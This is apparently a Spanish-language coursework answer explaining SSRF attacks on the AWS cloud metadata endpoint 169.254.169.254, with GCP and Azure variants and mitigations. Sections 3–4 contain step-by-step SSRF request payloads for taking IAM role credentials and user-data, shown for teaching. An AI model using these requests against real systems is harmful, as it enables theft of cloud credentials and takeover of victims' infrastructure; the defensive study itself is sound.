Objetivo 2: SSRF y el Peligro en la Nube (AWS/GCP)
En infraestructuras Cloud, una vulnerabilidad de Server-Side Request Forgery (SSRF) suele ser catastrófica. Investiga y explica qué sucede si un atacante encuentra un SSRF en una aplicación alojada en Amazon Web Services (AWS) y fuerza al servidor a hacer una petición GET a la dirección mágica 169.254.169.254. ¿Qué tipo de información altamente sensible espera extraer el atacante? Formato de entrega: Enlace al archivo .md.

# Objetivo 2: SSRF y el Peligro en la Nube (AWS/GCP)

## 1. Concepto Fundamental de SSRF (Server-Side Request Forgery)

**Server-Side Request Forgery (SSRF)** es una vulnerabilidad de seguridad en la que un atacante manipula una aplicación web para forzar al **servidor backend** a realizar peticiones HTTP/HTTPS arbitrarias hacia recursos a los que el atacante no tiene acceso directo.

A diferencia de XSS o CSRF (donde las acciones se ejecutan en el navegador del usuario cliente), en un ataque SSRF la petición es emitida directamente por el servidor web. Esto permite al atacante utilizar la confianza de la red interna del servidor para:

* Escanear la red local de la organización (intranet).
* Interactuar con servicios internos no expuestos a Internet (ej. Redis, Elasticsearch, bases de datos).
* Consultar interfaces de gestión e infraestructura en entornos de computación en la nube (*Cloud Infrastructure*).

```
┌──────────┐            1. Petición manipulada           ┌──────────────────────┐
│ Atacante ├────────────────────────────────────────────►│  Servidor Web (EC2)  │
└──────────┘  (ej. url=http://169.254.169.254/...)       └──────────┬───────────┘
                                                                    │
                                                                    │ 2. Consulta interna (GET)
                                                                    ▼
                                                         ┌──────────────────────┐
                                                         │   Servicio IMDS      │
                                                         │   169.254.169.254    │
                                                         └──────────────────────┘

```

## 2. La Dirección IP Mágica: `169.254.169.254` (IMDS)

### A. ¿Qué es la dirección `169.254.169.254`?

En la arquitectura de redes IPv4, la subred `169.254.0.0/16` corresponde a direcciones de **enlace local** (*Link-Local Addresses*, RFC 3927). 

En los proveedores de infraestructura en la nube como **Amazon Web Services (AWS)**, **Google Cloud Platform (GCP)**, **Microsoft Azure** y **OpenStack**, la IP `169.254.169.254` está reservada para el **Servicio de Metadatos de la Instancia** (*Instance Metadata Service* o **IMDS**).

### B. Función del IMDS

El IMDS es una API REST interna a la que solo se puede acceder desde el interior de la propia máquina virtual (instancia EC2 en AWS, Compute Engine en GCP). Su propósito es proveer a la instancia información sobre su propia configuración, red, etiquetas y credenciales de acceso para interactuar con otros servicios del proveedor cloud sin necesidad de almacenar credenciales estáticas en el código.

## 3. Anatomía de la Explotación en AWS (IMDSv1)

En la versión clásica del servicio de metadatos de AWS (**IMDSv1**), el servicio responde a peticiones `GET` HTTP simples **sin requerir ningún tipo de autenticación previa**, ya que presupone que cualquier proceso capaz de alcanzar `169.254.169.254` pertenece a la propia instancia.

### Paso a Paso del Ataque

#### 1. Descubrimiento del Endpoint de Metadatos
El atacante aprovecha un parámetro de la aplicación vulnerable (por ejemplo, una funcionalidad de descarga de imágenes o generación de PDF vía URL) e inyecta la IP del servicio de metadatos:

```http
GET /fetch-avatar?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: aplicacion-vulnerable.com
```

La respuesta expone la estructura de directorios del servicio de metadatos de AWS.

#### 2. Enumeración del Rol IAM Asignado
El atacante consulta la ruta específica que contiene la configuración de los roles de Identity and Access Management (IAM) asignados a la máquina virtual:

```http
GET /fetch-avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: aplicacion-vulnerable.com
```

**Respuesta del servidor:**
```text
DevOps-EC2-AdminRole
```

#### 3. Extracción de Credenciales de Seguridad de IAM
El atacante solicita las credenciales del rol descubierto:

```http
GET /fetch-avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/DevOps-EC2-AdminRole HTTP/1.1
Host: aplicacion-vulnerable.com
```

## 4. Información Altamente Sensible Extraída

Al acceder al endpoint de credenciales de IAM, la respuesta en formato JSON entrega credenciales temporales de AWS:

```json
{
  "Code" : "Success",
  "LastUpdated" : "2026-11-24T08:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAXXXXXXXXXXXXXXXX",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "IQoJb3JpZ2luX2VjE...",
  "Expiration" : "2026-11-24T14:00:00Z"
}
```

### ¿Qué obtiene el atacante?

1. **Credenciales Temporales de IAM (`AccessKeyId`, `SecretAccessKey`, `Token`):**
   Con estas tres llaves, el atacante puede configurar el CLI oficial de AWS (`aws configure`) desde su propia máquina local y actuar en nombre de la infraestructura de la víctima con los privilegios del rol `DevOps-EC2-AdminRole`.

2. **Datos de Inicio de la Instancia (*UserData*):**
   Al consultar `http://169.254.169.254/latest/user-data`, el atacante puede extraer los scripts de aprovisionamiento ejecutados cuando se creó la máquina. Con frecuencia, estos scripts contienen:
   * Contraseñas de bases de datos de producción en texto plano.
   * Claves privadas SSH.
   * Tokens de API de terceros (SendGrid, Stripe, GitHub, etc.).

3. **Información de Red y Configuración:**
   Direcciones IP privadas, rangos VPC, IDs de subred, certificados y credenciales de volumen EBS.

## 5. Impacto Catastrófico en la Infraestructura Cloud

Una vez que el atacante posee las credenciales de IAM de la instancia:

* **Movimiento Lateral y Pivotaje:** Pasa de comprometer una única aplicación web a tener acceso a la API global del proveedor Cloud (AWS/GCP/Azure).
* **Exfiltración masiva de datos:** Si el rol IAM de la máquina tiene permisos de lectura sobre buckets de Amazon S3 o bases de datos DynamoDB/RDS, el atacante puede descargar toda la base de datos de la empresa.
* **Escalado de Privilegios y Persistencia:** Puede crear nuevos usuarios IAM, generar llaves de acceso estáticas o desplegar recursos no autorizados (ej. minería de criptomonedas).

### Comportamiento en GCP y Azure

* **GCP:** El endpoint de metadatos se encuentra en `http://metadata.google.internal/computeMetadata/v1/` o `http://169.254.169.254`. GCP requiere la cabecera HTTP `Metadata-Flavor: Google`. Sin embargo, si el SSRF permite inyectar cabeceras, las credenciales del servicio de cuenta (*Service Account Tokens*) pueden ser comprometidas.
* **Azure:** Utiliza `http://169.254.169.254/metadata/instance?api-version=2021-02-01` y requiere la cabecera `Metadata: true`.

## 6. Estrategias de Remediación y Mitigación

### A. Migración Obligatoria a AWS IMDSv2

AWS introdujo **IMDSv2**, el cual reemplaza el modelo estático por una arquitectura basada en sesiones que **neutraliza el SSRF tradicional**.

IMDSv2 exige dos pasos:
1. Generar un token de sesión mediante una petición `PUT` con la cabecera `X-aws-ec2-metadata-token-ttl-seconds`.
2. Incluir dicho token en la cabecera `X-aws-ec2-metadata-token` de las peticiones `GET` subsecuentes.

```bash
# 1. Obtener Token (Método PUT)
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

# 2. Consultar Metadatos con el Token en Cabecera
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

Dado que la mayoría de los vectores SSRF simples solo permiten realizar peticiones `GET` y no pueden personalizar cabeceras HTTP arbitrarias ni ejecutar métodos `PUT` previos, **IMDSv2 detiene con éxito el ataque**.

### B. Bloqueo de Red (Reglas de Firewall / `iptables`)

Si la aplicación no requiere consultar los metadatos de la instancia, se debe bloquear el tráfico saliente hacia la IP `169.254.169.254` a nivel de host o contenedor:

```bash
# Bloquear tráfico al endpoint de metadatos con iptables en Linux
iptables -A OUTPUT -d 169.254.169.254 -j DROP
```

En entornos de contenedores (Docker / Kubernetes), se debe limitar el límite de saltos de red (*hop limit*) del paquete IP a 1 para evitar que los contenedores accedan al IMDS del host.

### C. Validación Estricta de URLs (Lista Blanca)

* Implementar listas blancas (*whitelists*) de dominios y esquemas permitidos (restringir a `http` / `https`).
* Resolver el nombre de dominio en el backend antes de realizar la petición y verificar que la IP resultante no pertenezca a rangos privados o de enlace local (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`).

### D. Aplicar el Principio de Mínimo Privilegio en IAM

Las instancias EC2/Compute Engine solo deben tener asignados los permisos estrictamente necesarios para su operación (por ejemplo, escribir en un bucket específico de S3 en lugar de otorgar permisos `AdministratorAccess`).